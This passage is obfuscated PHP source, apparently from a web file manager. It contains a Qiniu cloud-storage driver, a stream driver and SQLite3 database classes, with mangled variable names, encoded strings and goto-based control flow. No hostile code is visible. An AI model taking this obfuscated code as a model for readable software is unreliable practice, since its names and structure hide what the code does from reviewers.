$³¹ìôî¹ = $this->bucketManager->buildBatchDelete($this->bucket, $ø÷¦¾¬³); list($³ÖĞæõ, $¡’½ïôµ) = $this->bucketManager->batch($³¹ìôî¹); if ($¡’½ïôµ) { return !1; } } return !0; } public function rename($™„âçûÁ, $æñæïô) { return $this->renameObject($™„âçûÁ, $æñæïô); } public function fileInfo($ùÙ×¾Œ—, $¢Ó–•” = false, $éƒÚØ›¦ = array()) { $÷ˆ‡ÃË =& $_SERVER[Ò°Ì”İ•]; $îÁˆŸâ¶ = array($÷ˆ‡ÃË[32] => $this->pathThis($ùÙ×¾Œ—), $÷ˆ‡ÃË[98] => $this->getPathOuter($÷ˆ‡ÃË[8] . $ùÙ×¾Œ—), $÷ˆ‡ÃË[33] => $÷ˆ‡ÃË[243], $÷ˆ‡ÃË[90] => isset($éƒÚØ›¦[$÷ˆ‡ÃË[1527]]) ? $éƒÚØ›¦[$÷ˆ‡ÃË[1527]] : 0, $÷ˆ‡ÃË[180] => $this->ext($ùÙ×¾Œ—)); if ($¢Ó–•”) { return $îÁˆŸâ¶; } $îÁˆŸâ¶[$÷ˆ‡ÃË[244]] = $îÁˆŸâ¶[$÷ˆ‡ÃË[99]] = 0; $îÁˆŸâ¶[$÷ˆ‡ÃË[245]] = $îÁˆŸâ¶[$÷ˆ‡ÃË[246]] = !0; if (empty($éƒÚØ›¦)) { $éƒÚØ›¦ = $this->objectMeta($ùÙ×¾Œ—); if (!$éƒÚØ›¦) { return $îÁˆŸâ¶; } } if (isset($éƒÚØ›¦[$÷ˆ‡ÃË[247]]) && $éƒÚØ›¦[$÷ˆ‡ÃË[247]]) { $îÁˆŸâ¶[$÷ˆ‡ÃË[248]] = $éƒÚØ›¦[$÷ˆ‡ÃË[247]]; } if (isset($éƒÚØ›¦[$÷ˆ‡ÃË[258]]) && $éƒÚØ›¦[$÷ˆ‡ÃË[258]]) { $îÁˆŸâ¶[$÷ˆ‡ÃË[248]] = $éƒÚØ›¦[$÷ˆ‡ÃË[258]]; } if (isset($éƒÚØ›¦[$÷ˆ‡ÃË[1528]])) { $îÁˆŸâ¶[$÷ˆ‡ÃË[99]] = substr($éƒÚØ›¦[$÷ˆ‡ÃË[1528]] . $÷ˆ‡ÃË[12], 0, 10); } if (isset($éƒÚØ›¦[$÷ˆ‡ÃË[1527]])) { $îÁˆŸâ¶[$÷ˆ‡ÃË[90]] = $éƒÚØ›¦[$÷ˆ‡ÃË[1527]]; } return $îÁˆŸâ¶; } public function folderInfo($¥³ùÁí®, $‹şè­ìÜ = false) { $²»ÎşõÄ =& $_SERVER[Ò°Ì”İ•]; $„Š™©ºˆ = array($²»ÎşõÄ[32] => $this->pathThis($¥³ùÁí®), $²»ÎşõÄ[98] => $this->getPathOuter($²»ÎşõÄ[8] . $¥³ùÁí®), $²»ÎşõÄ[33] => $²»ÎşõÄ[89]); if ($‹şè­ìÜ) { return $„Š™©ºˆ; } $„Š™©ºˆ[$²»ÎşõÄ[244]] = $„Š™©ºˆ[$²»ÎşõÄ[99]] = 0; $„Š™©ºˆ[$²»ÎşõÄ[245]] = $„Š™©ºˆ[$²»ÎşõÄ[246]] = !0; $¥³ùÁí® = rtrim($¥³ùÁí®, $²»ÎşõÄ[8]) . $²»ÎşõÄ[8]; $à¢äîÒ = $this->objectMeta($¥³ùÁí®); if (isset($à¢äîÒ[$²»ÎşõÄ[1528]])) { $„Š™©ºˆ[$²»ÎşõÄ[99]] = substr($à¢äîÒ[$²»ÎşõÄ[1528]] . $²»ÎşõÄ[12], 0, 10); } return $„Š™©ºˆ; } public function listPath($áÎ‚¿ã , $‚ˆªëÔÈ = false) { $é«¥¥á½ =& $_SERVER[Ò°Ì”İ•]; $·¨ŠÚ“ò = $this->fileList($áÎ‚¿ã , $é«¥¥á½[8], !0); foreach ($·¨ŠÚ“ò[$é«¥¥á½[96]] as $´Ğì¬° => $ó¢¦Ö½é) { $·¨ŠÚ“ò[$é«¥¥á½[96]][$´Ğì¬°] = $this->folderInfo($ó¢¦Ö½é, $‚ˆªëÔÈ); } foreach ($·¨ŠÚ“ò[$é«¥¥á½[97]] as $´Ğì¬° => $ó¢¦Ö½é) { $·¨ŠÚ“ò[$é«¥¥á½[97]][$´Ğì¬°] = $this->fileInfo($ó¢¦Ö½é[$é«¥¥á½[108]], $‚ˆªëÔÈ, $ó¢¦Ö½é); } return $·¨ŠÚ“ò; } public function has($Ò¾™Ì¸Ï, $¯Ùë­×º = false, $‰˜—Ñì‰ = true) { $åèŒ¯ÔÉ =& $_SERVER[Ò°Ì”İ•]; $Ò¾™Ì¸Ï = trim($Ò¾™Ì¸Ï, $åèŒ¯ÔÉ[8]); $äÑ‡Ğ— = empty($Ò¾™Ì¸Ï) && $Ò¾™Ì¸Ï !== $åèŒ¯ÔÉ[241] ? $åèŒ¯ÔÉ[12] : $Ò¾™Ì¸Ï . $åèŒ¯ÔÉ[8]; $¡Ñ×È¿¦ = $åèŒ¯ÔÉ[12]; $Ğæ¢Ö´ = 500; $Á‘æÉ² = $åèŒ¯ÔÉ[8]; $¹íúÂ¸¬ = $ôÃ÷À¿Ï = 0; while (!0) { check_abort(); list($õñ©Ø—å, $í…¸ó—İ) = $this->bucketManager->listFiles($this->bucket, $äÑ‡Ğ—, $¡Ñ×È¿¦, $Ğæ¢Ö´, $Á‘æÉ²); if ($í…¸ó—İ) { break; } $¡Ñ×È¿¦ = array_key_exists($åèŒ¯ÔÉ[1473], $õñ©Ø—å) ? $¡Ñ×È¿¦ = $õñ©Ø—å[$åèŒ¯ÔÉ[1529]] : $åèŒ¯ÔÉ[12]; if ($¯Ùë­×º) { if (!empty($õñ©Ø—å[$åèŒ¯ÔÉ[1530]])) { $¹íúÂ¸¬ += count($õñ©Ø—å[$åèŒ¯ÔÉ[1530]]); } if (!empty($õñ©Ø—å[$åèŒ¯ÔÉ[1531]])) { $ôÃ÷À¿Ï += count($õñ©Ø—å[$åèŒ¯ÔÉ[1531]]); } if ($¡Ñ×È¿¦ === $åèŒ¯ÔÉ[12]) { break; } continue; } if ($‰˜—Ñì‰) { if (!empty($õñ©Ø—å[$åèŒ¯ÔÉ[1530]])) { return !0; } } else { if (!empty($õñ©Ø—å[$åèŒ¯ÔÉ[1531]])) { return !0; } } if ($¡Ñ×È¿¦ === $åèŒ¯ÔÉ[12]) { break; } } if ($¯Ùë­×º) { return array($åèŒ¯ÔÉ[252] => $¹íúÂ¸¬, $åèŒ¯ÔÉ[253] => $ôÃ÷À¿Ï); } return !1; } public function listAll($Ô’ÑÒ¾ò) { $îœ–ÛåÕ =& $_SERVER[Ò°Ì”İ•]; $Ïİ¿Ì¸é = $this->fileList($Ô’ÑÒ¾ò, $îœ–ÛåÕ[12], !0); $„“é’Âù = array_to_keyvalue($Ïİ¿Ì¸é[$îœ–ÛåÕ[97]], $îœ–ÛåÕ[32]); foreach ($Ïİ¿Ì¸é[$îœ–ÛåÕ[96]] as $öâÍŸ¨) { if (is_string($öâÍŸ¨)) { $„“é’Âù[$öâÍŸ¨] = array($îœ–ÛåÕ[90] => 0); } } return $this->listAllFiles($Ô’ÑÒ¾ò, $„“é’Âù); } private function fileList($ƒñùáÇ, $³İÓšØñ = '', $á¿˜­´Æ = 0) { $Èºøö… =& $_SERVER[Ò°Ì”İ•]; $ƒñùáÇ = trim($ƒñùáÇ, $Èºøö…[8]); $†ôú½¦Ã = empty($ƒñùáÇ) && $ƒñùáÇ !== $Èºøö…[241] ? $Èºøö…[12] : $ƒñùáÇ . $Èºøö…[8]; $»—™ÜÈ‡ = $Èºøö…[12]; $ƒØ—Ä•ä = 1000; $«ıİı±® = $à›İÍ = array(); while (!0) { check_abort(); list($ÃçÒÑÃ, $¯ôœëì) = $this->bucketManager->listFiles($this->bucket, $†ôú½¦Ã, $»—™ÜÈ‡, $ƒØ—Ä•ä, $³İÓšØñ); if ($¯ôœëì) { break; } $»—™ÜÈ‡ = array_key_exists($Èºøö…[1473], $ÃçÒÑÃ) ? $»—™ÜÈ‡ = $ÃçÒÑÃ[$Èºøö…[1529]] : $Èºøö…[12]; $ÎæÀí¦î = isset($ÃçÒÑÃ[$Èºøö…[1530]]) ? $ÃçÒÑÃ[$Èºøö…[1530]] : array(); $šëô–·ß = isset($ÃçÒÑÃ[$Èºøö…[1531]]) ? $ÃçÒÑÃ[$Èºøö…[1531]] : array(); foreach ($ÎæÀí¦î as $½±ıôÛ³) { if ($½±ıôÛ³[$Èºøö…[108]] == $†ôú½¦Ã) { continue; } $Ú’ñ¾²† = $½±ıôÛ³[$Èºøö…[108]]; $Ã¨©³äç = $½±ıôÛ³[$Èºøö…[1527]]; $½±ıôÛ³[$Èºøö…[90]] = $Ã¨©³äç; $©¨Œ¹Ë™ = $Ã¨©³äç == 0 && substr($Ú’ñ¾²†, strlen($Ú’ñ¾²†) - 1, 1) == $Èºøö…[8] ? !0 : !1; $this->cacheMethodInfoSet($Ú’ñ¾²†, $©¨Œ¹Ë™, $½±ıôÛ³); if ($©¨Œ¹Ë™) { $«ıİı±®[] = $Ú’ñ¾²†; continue; } $à›İÍ[] = $á¿˜­´Æ ? $½±ıôÛ³ : $Ú’ñ¾²†; } foreach ($šëô–·ß as $Ú’ñ¾²†) { if ($Ú’ñ¾²† == $†ôú½¦Ã) { continue; } $«ıİı±®[] = $Ú’ñ¾²†; $this->cacheMethodInfoSet($Ú’ñ¾²†, !0); } if ($»—™ÜÈ‡ === $Èºøö…[12]) { break; } } $this->cacheMethodInfoSet($ƒñùáÇ, !0); return array($Èºøö…[96] => $«ıİı±®, $Èºøö…[97] => $à›İÍ); } public function canRead($ƒ£Ãá©») { return $this->exist($ƒ£Ãá©») ? !0 : !1; } public function canWrite($í¦¼Şìì) { return $this->exist($í¦¼Şìì) ? !0 : !1; } public function getContent($ÓˆŸÒï¼) { return $this->fileSubstr($ÓˆŸÒï¼, 0, -1); } public function setContent($œç¤Äà, $êíİÀ× = '') { $ü¶ï÷Ø = $this->tempFile($this->pathThis($œç¤Äà)); file_put_contents($ü¶ï÷Ø, $êíİÀ×); if ($this->upload($œç¤Äà, $ü¶ï÷Ø)) { $this->tempFileRemve($ü¶ï÷Ø); return !0; } return !1; } public function refreshUrls($í¨ËªÍ¶) { $»Ïş× =& $_SERVER[Ò°Ì”İ•]; $É„ èß = array(); if (is_array($í¨ËªÍ¶)) { foreach ($í¨ËªÍ¶ as $•ßæ°§) { $É„ èß[] = $this->link($•ßæ°§); } } else { $É„ èß[] = $this->link($í¨ËªÍ¶); } $Ğıƒø©µ = new Qiniu\Cdn\CdnManager($this->auth); list($•ö‡‰ŸÒ, $¾ÔªÂâ) = $Ğıƒø©µ->refreshUrls($É„ èß); if ($¾ÔªÂâ) { return !1; } return $•ö‡‰ŸÒ[$»Ïş×[1260]] == $»Ïş×[832] ? !0 : !1; } public function fileSubstr($ƒÃˆÉ¼ò, $™¶ñ›ŠÊ, $²·‘‡ƒ€) { $€¸ŒÇœå =& $_SERVER[Ò°Ì”İ•]; if (!($È•ôĞÚ¹ = $this->link($ƒÃˆÉ¼ò))) { return !1; } $ÚÔêØ™¯ = !1; if ($²·‘‡ƒ€ > 0) { $»¤§À¤ = $™¶ñ›ŠÊ + $²·‘‡ƒ€ - 1; $ÚÔêØ™¯ = array($€¸ŒÇœå[1532] . $™¶ñ›ŠÊ . $€¸ŒÇœå[474] . $»¤§À¤); } $ïÏ‰É¡× = url_request($È•ôĞÚ¹, $€¸ŒÇœå[1492], !1, $ÚÔêØ™¯); return $ïÏ‰É¡×[$€¸ŒÇœå[823]] ? $ïÏ‰É¡×[$€¸ŒÇœå[1283]] : !1; } public function upload($«ğ‰»¸, $²¿ı‚, $ı´¢¹”ã = false, $ñÊßÛåÎ = REPEAT_REPLACE) { $áœÉÓ = new Qiniu\Storage\UploadManager(); $ùÍ­¨Ñ² = $this->auth->uploadToken($this->bucket, $«ğ‰»¸); $íªÚÊ‹Ş = get_file_mime(get_path_ext($²¿ı‚)); list($Ìšò¡æç, $»ø…•ÔŞ) = $áœÉÓ->putFile($ùÍ­¨Ñ², $«ğ‰»¸, $²¿ı‚, null, $íªÚÊ‹Ş); return $»ø…•ÔŞ ? !1 : $this->getPathOuter($«ğ‰»¸); } public function uploadFormData($ß‹é¾³€, $ïØïüŒ = 3600) { return $this->uploadToken($ß‹é¾³€, $ïØïüŒ); } public function uploadMultiData($±©”Íõƒ, $•Œøãˆª = 3600) { return $this->uploadToken($±©”Íõƒ, $•Œøãˆª); } private function uploadToken($¡ƒÒšò°, $Âù‡÷Üó = 3600) { $Šê“Æù¡ =& $_SERVER[Ò°Ì”İ•]; $ŸÅ…¡ü = $Âù‡÷Üó; $ˆÃÊÆ„ë = array($Šê“Æù¡[1533] => $Šê“Æù¡[1534]); $Á†Ìõ£° = $¡ƒÒšò°; $Ğèù–¿È = $this->auth->uploadToken($this->bucket, $Á†Ìõ£°, $ŸÅ…¡ü, $ˆÃÊÆ„ë, !0); $‚ä²£“Š = empty($this->region) || $this->region == $Šê“Æù¡[1535] ? $Šê“Æù¡[12] : $Šê“Æù¡[474] . $this->region; $°ğó…À„ = http_type() . "\x3a\x2f\x2f\165\160\x6c\157\141\144{$‚ä²£“Š}\56\x71\x69\x6e\x69\x75\x70\x2e\143\157\155\57"; return array($Šê“Æù¡[1536] => $Ğèù–¿È, $Šê“Æù¡[1537] => $°ğó…À„); } public function download($çÀè½²Ğ, $º¬ÖÈî) { $†º‘½õ = IO::getPathInner(IO::mkfile($º¬ÖÈî)); if (!($®Ò´›ìÍ = $this->link($çÀè½²Ğ))) { return !1; } $ ı¡½íé = 0; $»ÙÉªÑ» = 1024 * 200; $µ³­‰¡Ü = fopen($†º‘½õ, $_SERVER[Ò°Ì”İ•][1538]); while (!0) { $ƒâÊÔ… = $this->fileSubstr($çÀè½²Ğ, $ ı¡½íé, $»ÙÉªÑ»); if ($ƒâÊÔ… === !1) { return !1; } fwrite($µ³­‰¡Ü, $ƒâÊÔ…); $ ı¡½íé += $»ÙÉªÑ»; if (strlen($ƒâÊÔ…) < $»ÙÉªÑ») { break; } } fclose($µ³­‰¡Ü); return $º¬ÖÈî; } public function link($Å£ã˜Š‹, $ßÈ ‚Í = '') { if (!$this->isFile($Å£ã˜Š‹)) { return !1; } $úöÕõŞ = $this->getHost() . $_SERVER[Ò°Ì”İ•][8] . $this->pathEncode($Å£ã˜Š‹) . $ßÈ ‚Í; return $this->auth->privateDownloadUrl($úöÕõŞ, 3600 * 12); } public function fileOut($œĞÑ¢Ó, $÷“âò« = false, $ìå·¹Şò = false, $­ô”ñ„ş = '') { $Õ£ÈŸ  =& $_SERVER[Ò°Ì”İ•]; if ($this->isFileOutServer()) { return $this->fileOutServer($œĞÑ¢Ó, $÷“âò«, $ìå·¹Şò, $­ô”ñ„ş); } if (!$ìå·¹Şò) { $ìå·¹Şò = $this->pathThis($œĞÑ¢Ó); } $”Ş¡ëæÄ = $÷“âò« ? $Õ£ÈŸ [1539] . rawurlencode($ìå·¹Şò) : $Õ£ÈŸ [12]; $­ÄÇã¯¬ = $this->link($œĞÑ¢Ó, $”Ş¡ëæÄ); $this->fileOutLink($­ÄÇã¯¬); } public function fileOutServer($İ×õ¯, $ ­ØÙÉì = false, $éÀæ™İ = false, $Šë çâÂ = '') { parent::fileOut($İ×õ¯, $ ­ØÙÉì, $éÀæ™İ, $Šë çâÂ); } public function fileOutImage($¢÷çÄê©, $ŒÎÂ×Ëû = 250) { if ($this->size($¢÷çÄê©) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¢÷çÄê©, $ŒÎÂ×Ëû); } $ÀÏ¢€ ‡ = $this->link($¢÷çÄê©, $_SERVER[Ò°Ì”İ•][1540] . $ŒÎÂ×Ëû); $this->fileOutLink($ÀÏ¢€ ‡); } public function fileOutImageServer($­¹úòñÜ, $‰—Àİ®« = 250) { parent::fileOutImage($­¹úòñÜ, $‰—Àİ®«); } public function hashMd5($‘Ö‘öÃ¨) { $ Ğ»– =& $_SERVER[Ò°Ì”İ•]; $Ì¨‘²ùİ = $this->objectMeta($‘Ö‘öÃ¨); return isset($Ì¨‘²ùİ[$ Ğ»–[258]]) ? $Ì¨‘²ùİ[$ Ğ»–[258]] : !1; $ÖòŸ¥¨“ = $this->link($‘Ö‘öÃ¨, $ Ğ»–[1541]); } public function size($é¹œĞäå) { $ï­ƒ¿·· = $this->objectMeta($é¹œĞäå); return $ï­ƒ¿·· ? $ï­ƒ¿··[$_SERVER[Ò°Ì”İ•][90]] : 0; } public function info($ç“îøÓ©) { if ($this->isFolder($ç“îøÓ©)) { return $this->folderInfo($ç“îøÓ©); } else { if ($this->isFile($ç“îøÓ©)) { return $this->fileInfo($ç“îøÓ©); } } return !1; } public function exist($Âº“ŒÑÏ) { return $this->isFile($Âº“ŒÑÏ) || $this->isFolder($Âº“ŒÑÏ); } public function isFile($É•«ùì) { return !$this->isFolder($É•«ùì) && $this->objectMeta($É•«ùì); } public function isFolder($ÎüñÜ ÷) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][190], $ÎüñÜ ÷); } protected function objectMeta($û¯¬Í©¦) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][192], $û¯¬Í©¦); } protected function _objectMeta($ãñÎÖúĞ) { $ÕïÎ€Ï¦ =& $_SERVER[Ò°Ì”İ•]; list($ÈäÒì‘”, $Æù°¾¡) = $this->bucketManager->stat($this->bucket, $ãñÎÖúĞ); if ($ÈäÒì‘”) { $ÈäÒì‘”[$ÕïÎ€Ï¦[90]] = intval($ÈäÒì‘”[$ÕïÎ€Ï¦[1527]]); } return $ÈäÒì‘”; } protected function _isFolder($ªğ£ûÄµ) { $ÖŒ¾ıÓœ =& $_SERVER[Ò°Ì”İ•]; if ($ªğ£ûÄµ == $ÖŒ¾ıÓœ[12] || $ªğ£ûÄµ == $ÖŒ¾ıÓœ[8]) { return !0; } list($ŠôÔúŸÏ, $Ä‰Š¨çã) = $this->bucketManager->listFiles($this->bucket, trim($ªğ£ûÄµ, $ÖŒ¾ıÓœ[8]) . $ÖŒ¾ıÓœ[8], $ÖŒ¾ıÓœ[12], 1, $ÖŒ¾ıÓœ[8]); return !empty($ŠôÔúŸÏ[$ÖŒ¾ıÓœ[1530]]) || !empty($ŠôÔúŸÏ[$ÖŒ¾ıÓœ[1531]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ŞÎ‡»êş, $æÆàğÛ = 0) { parent::__construct(); $this->source = $ŞÎ‡»êş; $this->sourceSize = $æÆàğÛ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‡ğ˜«¾Ü = false) { return $this->sourceSize; } public function getContent($í¾Àï™Í = false) { return $this->fileSubstr($í¾Àï™Í, 0, $this->sourceSize); } public function fileSubstr($à°Ğ¬› = false, $ŸÃí©¢ñ = 0, $…©ÑÒä¿ = 0) { if (!$…©ÑÒä¿) { $…©ÑÒä¿ = $this->sourceSize; } $ñœ¢ğ’´ = $this->sourceSize - $ŸÃí©¢ñ; if ($…©ÑÒä¿ >= $ñœ¢ğ’´) { $…©ÑÒä¿ = $ñœ¢ğ’´; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ŸÃí©¢ñ, $…©ÑÒä¿); } if ($this->sourceType == self::TYPE_FILE) { if ($…©ÑÒä¿ <= 0) { return $_SERVER[Ò°Ì”İ•][12]; } $šáµÃà = ftell($this->source); fseek_64($this->source, $šáµÃà + $ŸÃí©¢ñ); $ÑÙ£¢ë = @fread($this->source, $…©ÑÒä¿); fseek_64($this->source, $šáµÃà); return $ÑÙ£¢ë; } } public function hashMd5($Ñë øƒ = false) { return md5($this->getContent()); } public static function hash($’äª‰£í, $Õ©ÆêåÍ = 0) { $Ù–°ÜŒî = new PathDriverStream($’äª‰£í, $Õ©ÆêåÍ); return $Ù–°ÜŒî->hashSimple($’äª‰£í); } public static function md5($İæÑªæ†, $’úÔÏ¯• = 0) { $öÉÄá– = new PathDriverStream($İæÑªæ†, $’úÔÏ¯•); return $öÉÄá–->hashMd5($İæÑªæ†); } } goto E‡‰—ë¯; CÔöµÔÚ§: class DbSqlite3Base extends Db { public function __construct($É‰û‡É = '') { $Îï¥¬ˆü =& $_SERVER[Ò°Ì”İ•]; if (!class_exists($Îï¥¬ˆü[64])) { think_exception(think_lang($Îï¥¬ˆü[14]) . $Îï¥¬ˆü[65]); } if (!empty($É‰û‡É)) { if (!isset($É‰û‡É[$Îï¥¬ˆü[16]])) { $É‰û‡É[$Îï¥¬ˆü[16]] = 438; } $this->config = $É‰û‡É; if (empty($this->config[$Îï¥¬ˆü[17]])) { $this->config[$Îï¥¬ˆü[17]] = array(); } } } public function connect($÷åıÆÊè = '', $Äşäî²¥ = 0) { $–Ÿ½˜ =& $_SERVER[Ò°Ì”İ•]; if (!isset($this->linkID[$Äşäî²¥])) { if (empty($÷åıÆÊè)) { $÷åıÆÊè = $this->config; } $this->linkID[$Äşäî²¥] = new SQLite3($÷åıÆÊè[$–Ÿ½˜[21]]); if (!$this->linkID[$Äşäî²¥]) { think_exception($this->linkID[$Äşäî²¥]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Äşäî²¥]->busyTimeout(30000); if (1 != think_config($–Ÿ½˜[22])) { unset($this->config); } } return $this->linkID[$Äşäî²¥]; } public function free() { $this->queryID = null; } public function query($ì”‡·óæ) { $Ø†‡ï×ğ =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ì”‡·óæ; if ($this->queryID) { $this->free(); } think_action_status($Ø†‡ï×ğ[23], 1); think_status($Ø†‡ï×ğ[24]); $this->queryID = $this->_linkID->query($ì”‡·óæ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ğäñÎÛå = $this->getAll(); $this->numRows = count($ğäñÎÛå); return $ğäñÎÛå; } } public function execute($ª¤é÷âë) { $ŒæŒàó =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ª¤é÷âë; if ($this->queryID) { $this->free(); } think_action_status($ŒæŒàó[25], 1); think_status($ŒæŒàó[24]); $¿¸â ˆö = $this->_linkID->exec($ª¤é÷âë); $this->debug(); if (!1 === $¿¸â ˆö) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ò°Ì”İ•][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $´­§Áû = $this->_linkID->query($_SERVER[Ò°Ì”İ•][27]); if (!$´­§Áû) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ó°àÏÓ = $this->_linkID->query($_SERVER[Ò°Ì”İ•][28]); if (!$Ó°àÏÓ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $«Ù¨ˆğä = array(); while ($±¬›€æÖ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $«Ù¨ˆğä[] = $±¬›€æÖ; } $this->queryID->reset(); return $«Ù¨ˆğä; } public function getFields($—ÈÔõ¼©) { $Û•ª’¦Ù =& $_SERVER[Ò°Ì”İ•]; $’”äÂµµ = $this->query($Û•ª’¦Ù[29] . $—ÈÔõ¼© . $Û•ª’¦Ù[30]); $Ïö‡©©ã = array(); if ($’”äÂµµ) { foreach ($’”äÂµµ as $ğ•»µ˜› => $ëß¢æ¨) { $Ïö‡©©ã[$ëß¢æ¨[$Û•ª’¦Ù[32]]] = array($Û•ª’¦Ù[32] => $ëß¢æ¨[$Û•ª’¦Ù[32]], $Û•ª’¦Ù[33] => $ëß¢æ¨[$Û•ª’¦Ù[33]], $Û•ª’¦Ù[35] => (bool) ($ëß¢æ¨[$Û•ª’¦Ù[35]] === $Û•ª’¦Ù[12]), $Û•ª’¦Ù[37] => $ëß¢æ¨[$Û•ª’¦Ù[66]], $Û•ª’¦Ù[39] => (bool) $ëß¢æ¨[$Û•ª’¦Ù[67]], $Û•ª’¦Ù[42] => (bool) $ëß¢æ¨[$Û•ª’¦Ù[67]]); } } return $Ïö‡©©ã; } public function getTables($‰»ğ½ËÍ = '') { $ĞË‹Ã¢Ã =& $_SERVER[Ò°Ì”İ•]; $¯½Ñ÷£ = $this->query($ĞË‹Ã¢Ã[45] . $ĞË‹Ã¢Ã[46] . $ĞË‹Ã¢Ã[47]); $ÁÒ’Ä¿‰ = array(); foreach ($¯½Ñ÷£ as $¯œ‰íò => $ä˜×’ãÃ) { $ÁÒ’Ä¿‰[$¯œ‰íò] = current($ä˜×’ãÃ); } return $ÁÒ’Ä¿‰; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ù‡æã•Ã =& $_SERVER[Ò°Ì”İ•]; $this->error = $this->_linkID->lastErrorMsg(); if ($ù‡æã•Ã[12] != $this->queryStr) { $this->error .= LNG($ù‡æã•Ã[48]) . $this->queryStr; } think_trace($this->error, $ù‡æã•Ã[12], $ù‡æã•Ã[49]); return $this->error; } public function escapeString($¸äêâíœ) { $Ùşşåò =& $_SERVER[Ò°Ì”İ•]; if ($this->_linkID) { return $this->_linkID->escapeString($¸äêâíœ); } return str_ireplace($Ùşşåò[68], $Ùşşåò[69], $¸äêâíœ); } public function parseLimit($ÉñÜ°ú€) { $«ŸÉ·¾ =& $_SERVER[Ò°Ì”İ•]; $ è¼äû£ = $«ŸÉ·¾[12]; if (!empty($ÉñÜ°ú€)) { $ÉñÜ°ú€ = explode($«ŸÉ·¾[50], $ÉñÜ°ú€); if (count($ÉñÜ°ú€) > 1) { $ è¼äû£ .= $«ŸÉ·¾[51] . $ÉñÜ°ú€[1] . $«ŸÉ·¾[52] . $ÉñÜ°ú€[0] . $«ŸÉ·¾[53]; } else { $ è¼äû£ .= $«ŸÉ·¾[51] . $ÉñÜ°ú€[0] . $«ŸÉ·¾[53]; } } return $ è¼äû£; } } $_file = $_SERVER[$_SERVER[Ò°Ì”İ•][63]]; $_size = $_SERVER[Ò°Ì”İ•][70]; goto fÍÄ‹‰£„; E¨‡æ®è¿¤: class DbSqlite3 extends DbSqlite3Base { public function query($ÎºôÓï§) { $Ìøéî»ï =& $_SERVER[Ò°Ì”İ•]; if (!CacheLock::fileLock($Ìøéî»ï[13])) { return !1; } $¸ÊÔÙÏÆ = parent::query($ÎºôÓï§); CacheLock::fileUnLock($Ìøéî»ï[13]); return $¸ÊÔÙÏÆ; } public function execute($Ğ×ì‹Àã) { $ô«ÙÂº =& $_SERVER[Ò°Ì”İ•]; if (!CacheLock::fileLock($ô«ÙÂº[13])) { return !1; } $‰¦òé« = parent::execute($Ğ×ì‹Àã); CacheLock::fileUnLock($ô«ÙÂº[13]); return $‰¦òé«; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\x3c\76", "\x67\x74" => "\76", "\145\147\x74" => "\76\x3d", "\154\164" => "\x3c", "\145\x6c\x74" => "\x3c\x3d", "\x6e\x6f\x74\x6c\151\153\x65" => "\116\117\x54\x20\x4c\x49\x4b\105", "\154\151\x6b\145" => "\114\111\113\105", "\x69\156" => "\111\116", "\156\157\164\x69\156" => "\x4e\x4f\x54\40\111\x4e", "\156\157\x74\x20\151\156" => "\116\x4f\124\x20\111\116", "\x62\x65\x74\167\x65\145\x6e" => "\102\105\124\x57\x45\x45\x4e", "\x6e\x6f\164\142\x65\164\x77\x65\x65\156" => "\x4e\117\124\x20\x42\105\124\x57\105\x45\116", "\156\x6f\164\x20\142\x65\x74\167\145\x65\x6e" => "\116\x4f\x54\x20\102\x45\x54\x57\105\x45\x4e"); protected $selectSql = "\123\x45\114\x45\x43\124\x25\104\111\123\124\111\x4e\x43\x54\x25\x20\45\x46\111\x45\x4c\104\45\40\106\x52\x4f\115\40\x25\x54\101\x42\x4c\x45\x25\45\x4a\x4f\111\x4e\x25\45\x57\110\105\x52\x45\x25\45\x47\x52\117\125\x50\45\x25\x48\101\x56\111\116\x47\45\45\x4f\x52\104\x45\122\45\x25\114\x49\x4d\111\124\45\40\x25\125\x4e\111\x4f\x4e\45\45\103\117\x4d\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $ŒÑÙË· = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ò°Ì”İ•][1033], $ŒÑÙË·); } public function factory($úŞÅ½³ = '') { $à¯‚üĞ© =& $_SERVER[Ò°Ì”İ•]; $úŞÅ½³ = $this->parseConfig($úŞÅ½³); if (empty($úŞÅ½³[$à¯‚üĞ©[1034]])) { think_exception(think_lang($à¯‚üĞ©[1035])); } $this->dbType = ucwords(strtolower($úŞÅ½³[$à¯‚üĞ©[1034]])); $ëÀõ¥˜Ç = $à¯‚üĞ©[1036] . $this->dbType; if (class_exists($ëÀõ¥˜Ç)) { $´‘Û¶ªˆ = new $ëÀõ¥˜Ç($úŞÅ½³); if ($à¯‚üĞ©[1037] != strtolower($úŞÅ½³[$à¯‚üĞ©[1034]])) { $´‘Û¶ªˆ->dbType = strtoupper($this->dbType); } else { $´‘Û¶ªˆ->dbType = 